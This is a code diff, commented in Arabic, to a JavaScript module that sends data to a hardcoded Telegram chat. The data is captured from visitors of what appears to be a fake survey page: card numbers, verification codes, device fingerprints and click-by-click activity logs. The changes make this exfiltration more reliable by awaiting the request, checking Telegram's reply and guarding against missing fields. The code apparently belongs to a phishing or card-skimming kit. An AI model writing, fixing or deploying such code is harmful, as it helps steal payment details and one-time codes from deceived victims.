@@ -5,6 +5,12 @@ const TELEGRAM_CHAT_ID = '7590246763'; // ضع معرف الدردشة هنا
 // إرسال البيانات إلى تليجرام
 async function sendTelegramData(eventType, data) {
     try {
+        // التحقق من وجود التوكن ورقم الدردشة
+        if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+            console.error('❌ يرجى تعيين معلومات بوت تليجرام الصحيحة في telegram.js');
+            return false;
+        }
+
         const message = formatTelegramMessage(eventType, data);
         
         // إعداد طلب HTTP
@@ -17,22 +23,28 @@ async function sendTelegramData(eventType, data) {
             disable_notification: false
         };
         
-        // إرسال البيانات (غير متزامن، لا ينتظر الاستجابة)
-        fetch(url, {
+        // إرسال البيانات مع التعامل مع الاستجابة
+        const response = await fetch(url, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify(payload)
-        }).catch(error => {
-            console.error('Error sending to Telegram:', error);
         });
         
-        // حفظ محلي للبيانات (للنسخ الاحتياطي)
-        saveDataLocally(eventType, data);
+        const responseData = await response.json();
+        
+        if (responseData.ok) {
+            console.log('✅ تم الإرسال بنجاح إلى تليجرام');
+            return true;
+        } else {
+            console.error('❌ خطأ من تليجرام:', responseData.description);
+            return false;
+        }
         
     } catch (error) {
-        console.error('Error in sendTelegramData:', error);
+        console.error('❌ خطأ في اتصال تليجرام:', error.message);
+        return false;
     }
 }
 
@@ -88,11 +100,13 @@ function formatTelegramMessage(eventType, data) {
             message += `💳 <b>البطاقة:</b> ${maskCardNumber(data.cardNumber)}\n`;
             message += `🔢 <b>كود التحقق:</b> ${data.verificationCode}\n\n`;
             message += `<b>🖥️ معلومات الجهاز:</b>\n`;
-            message += `📱 <b>النوع:</b> ${data.deviceInfo.deviceType}\n`;
-            message += `⚙️ <b>نظام التشغيل:</b> ${data.deviceInfo.os}\n`;
-            message += `🌐 <b>المتصفح:</b> ${data.deviceInfo.browser}\n`;
-            message += `📐 <b>الدقة:</b> ${data.deviceInfo.screenWidth}×${data.deviceInfo.screenHeight}\n`;
-            message += `🗣️ <b>اللغة:</b> ${data.deviceInfo.language}\n`;
+            if (data.deviceInfo) {
+                message += `📱 <b>النوع:</b> ${data.deviceInfo.deviceType || 'غير معروف'}\n`;
+                message += `⚙️ <b>نظام التشغيل:</b> ${data.deviceInfo.os || 'غير معروف'}\n`;
+                message += `🌐 <b>المتصفح:</b> ${data.deviceInfo.browser || 'غير معروف'}\n`;
+                message += `📐 <b>الدقة:</b> ${data.deviceInfo.screenWidth || 0}×${data.deviceInfo.screenHeight || 0}\n`;
+                message += `🗣️ <b>اللغة:</b> ${data.deviceInfo.language || 'غير معروف'}\n`;
+            }
             break;
             
         case 'session_ended':
@@ -104,9 +118,11 @@ function formatTelegramMessage(eventType, data) {
             
         case 'user_actions_summary':
             message += `📈 <b>ملخص الإجراءات:</b>\n`;
-            data.actions.forEach((action, index) => {
-                message += `${index + 1}. ${getActionDescription(action)}\n`;
-            });
+            if (data.actions && data.actions.length > 0) {
+                data.actions.forEach((action, index) => {
+                    message += `${index + 1}. ${getActionDescription(action)}\n`;
+                });
+            }
             break;
             
         default:
@@ -115,7 +131,6 @@ function formatTelegramMessage(eventType, data) {
     
     // إضافة رابط للجلسة
     message += `\n────────────────────\n`;
-    message += `🔗 <a href="https://t.me/your_bot">عرض التفاصيل الكاملة</a>`;
     
     return message;
 }
@@ -139,20 +154,26 @@ function getEventTypeName(eventType) {
 }
 
 function formatTime(isoString) {
-    const date = new Date(isoString);
-    return date.toLocaleString('ar-SA', {
-        timeZone: 'Africa/Algiers',
-        hour12: true,
-        year: 'numeric',
-        month: 'long',
-        day: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit'
-    });
+    try {
+        const date = new Date(isoString);
+        return date.toLocaleString('ar-SA', {
+            timeZone: 'Africa/Algiers',
+            hour12: true,
+            year: 'numeric',
+            month: 'long',
+            day: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit'
+        });
+    } catch (error) {
+        return isoString;
+    }
 }
 
 function formatDuration(ms) {
+    if (!ms) return '0 ثانية';
+    
     const seconds = Math.floor(ms / 1000);
     const minutes = Math.floor(seconds / 60);
     const hours = Math.floor(minutes / 60);
@@ -169,17 +190,20 @@ function formatDuration(ms) {
 function maskCardNumber(cardNumber) {
     if (!cardNumber) return 'غير معروف';
     const cleanNumber = cardNumber.replace(/\s/g, '');
+    if (cleanNumber.length < 4) return '****';
     return `**** **** **** ${cleanNumber.slice(-4)}`;
 }
 
 function getActionDescription(action) {
+    if (!action || !action.type) return 'إجراء غير معروف';
+    
     switch(action.type) {
         case 'page_view':
-            return `صفحة: ${action.data.page}`;
+            return `صفحة: ${action.data?.page || 'غير معروف'}`;
         case 'button_click':
-            return `نقر: ${action.data.text}`;
+            return `نقر: ${action.data?.text || 'غير معروف'}`;
         case 'touch_event':
-            return `لمس: ${action.data.touches} إصبع`;
+            return `لمس: ${action.data?.touches || 0} إصبع`;
         default:
             return action.type;
     }
@@ -224,22 +248,15 @@ function cleanupOldLocalData() {
     }
 }
 
-// وظيفة لتحميل جميع البيانات المحفوظة (للتطوير)
-function getAllLocalData() {
-    const allData = [];
-    
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        if (key && key.startsWith('survey_data_')) {
-            try {
-                const data = JSON.parse(localStorage.getItem(key));
-                allData.push(data);
-            } catch (e) {
-                // تجاهل البيانات التالفة
-            }
+// وظيفة مساعدة للحصول على معرف الجلسة
+function getSessionId() {
+    try {
+        if (!sessionStorage.getItem('survey_session_id')) {
+            sessionStorage.setItem('survey_session_id', 
+                'sess_' + Math.random().toString(36).substr(2, 9));
         }
+        return sessionStorage.getItem('survey_session_id');
+    } catch (error) {
+        return 'error_' + Date.now();
     }
-    
-    return allData;
 }
-
